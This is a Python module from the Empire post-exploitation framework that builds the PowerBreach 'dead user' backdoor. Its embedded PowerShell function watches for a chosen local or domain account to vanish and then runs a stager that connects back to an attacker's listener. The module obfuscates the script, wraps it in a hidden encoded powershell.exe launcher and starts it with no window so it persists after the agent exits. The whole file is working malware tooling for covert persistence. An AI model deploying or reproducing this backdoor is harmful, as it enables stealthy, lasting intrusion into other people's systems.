from __future__ import print_function

import os
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        script = """
function Invoke-DeadUserBackdoor
{
    Param(  
    [Parameter(Mandatory=$False,Position=1)]
    [int]$Timeout=0,
    [Parameter(Mandatory=$False,Position=2)]
    [int] $Sleep=30,
    [Parameter(Mandatory=$True,Position=3)]
    [string] $Username,
    [Parameter(Mandatory=$False,Position=4)]
    [switch] $Domain
    )
    
    $running=$True
    $match =""
    $starttime = Get-Date
    while($running)
    {
        if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))
        {
            $running=$False
        }        
        if($Domain)
        {
            $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
            $UserSearcher.PageSize = 1000
            $count = @($UserSearcher.FindAll()).Count
            if($count -eq 0)
            {
                Write-Verbose "Domain user $Username not found!"
                $match=$True
            }
        }
        else
        {
            $comp = $env:computername
            [ADSI]$server="WinNT://$comp"
            $usercheck = $server.children | where{$_.schemaclassname -eq "user" -and $_.name -eq $Username}
            if(-not $usercheck)
            {
                $match=$True
            }
        }
        if($match)
        {
            REPLACE_LAUNCHER
            $running=$False
        }
        else
        {
            Start-Sleep -s $Sleep
        }
    }   
}
Invoke-DeadUserBackdoor"""

        listener_name = params['Listener']

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        else:
            # set the listener value for the launcher
            stager = main_menu.stagers.stagers["multi/launcher"]
            stager.options['Listener'] = listener_name
            stager.options['Base64'] = "False"

            # and generate the code
            stager_code = stager.generate()

            if stager_code == "":
                return handle_error_message('[!] Error creating stager')
            else:
                script = script.replace("REPLACE_LAUNCHER", stager_code)

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values) 

        out_file = params['OutFile']
        if out_file != '':
            # make the base directory if it doesn't exist
            if not os.path.exists(os.path.dirname(out_file)) and os.path.dirname(out_file) != '':
                os.makedirs(os.path.dirname(out_file))

            f = open(out_file, 'w')
            f.write(script)
            f.close()

            return handle_error_message("[+] PowerBreach deaduser backdoor written to " + out_file)

        script = data_util.keyword_obfuscation(script)
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)

        # transform the backdoor into something launched by powershell.exe
        # so it survives the agent exiting  
        modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
        launcher = helpers.powershell_launcher(script, modifiable_launcher)
        stager_code = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
        parts = stager_code.split(" ")

        # set up the start-process command so no new windows appears
        script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
